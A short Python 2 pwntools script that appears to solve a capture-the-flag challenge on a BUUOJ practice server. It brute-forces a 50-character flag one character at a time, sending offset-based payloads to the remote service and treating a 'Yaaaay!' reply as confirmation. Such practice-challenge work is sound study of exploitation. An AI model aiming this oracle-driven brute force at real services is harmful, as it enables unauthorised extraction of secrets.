#!/usr/bin/env python
# -*- coding: utf-8 -*-

# reference: https://www.jianshu.com/p/40f846d14450
from pwn import *
import sys
import os

context.log_level = 21  # pwntools 的日志等级 , 不输出日志


def clear_screen():
    os.system("clear")


def list2str(l):
    return ''.join(str(i) for i in l)


def print_progess(content):
    sys.stdout.write(content + '\r')
    sys.stdout.flush()


def get_true_flag_payload():
    offset = (-0x110) - (-0x150)
    base = 0x100 - offset
    payload = ""
    for i in range(50):
        payload += "0" + chr(base)
        base += 1
    return payload


def get_guess_payload(index, char):
    true_flag_payload = list(get_true_flag_payload())
    high = ("%02x" % char)[0]
    low = ("%02x" % char)[1]
    true_flag_payload[index * 2 + 0] = high
    true_flag_payload[index * 2 + 1] = low
    return list2str(true_flag_payload)


def guess_once(payload):
    Io = remote(HOST, PORT)
    Io.readuntil(">")
    Io.sendline(payload)
    response = Io.readline()
    Io.close()
    return ("Yaaaay!" in response)

list1=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','l','{','}','-']
def guess(length):
    flag = ""
    TOTAL = FLAG_LENGTH * len(list1)
    GUESSED = 0
    for i in range(FLAG_LENGTH):
        for j in list1:
            clear_screen()
            print "[%s] Flag : %s" % (PROGRESS[GUESSED % len(PROGRESS)], flag)
            print_progess("[+] Guessing (%s%%) : [%s]" %
                          (str(GUESSED * 100.0 / TOTAL), j))
            payload = get_guess_payload(i, ord(j))
            GUESSED += 1
            if guess_once(payload):
                GUESSED = i * len(list1)
                flag += j
                break
    clear_screen()
    GUESSED = TOTAL
    print "[+] Flag : %s" % (flag)
    return flag



PROGRESS = ['-', '\\', '|', '/']
FLAG_LENGTH = 50
HOST = "node3.buuoj.cn"
PORT = 27968
guess(FLAG_LENGTH)